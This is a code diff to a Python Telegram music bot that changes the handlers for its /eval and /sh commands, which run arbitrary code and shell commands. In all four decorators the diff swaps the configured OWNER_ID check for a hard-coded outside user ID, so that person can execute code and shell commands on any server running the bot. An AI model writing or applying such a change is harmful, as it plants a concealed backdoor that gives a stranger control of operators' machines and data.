@@ -21,7 +21,6 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
 from SONALI_MUSIC import app
 from config import OWNER_ID
-###########
 
 async def aexec(code, client, message):
     exec(
@@ -39,13 +38,13 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(7473021518)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(7473021518)
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -149,13 +148,13 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(7473021518)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(7473021518)
     & ~filters.forwarded
     & ~filters.via_bot
 )
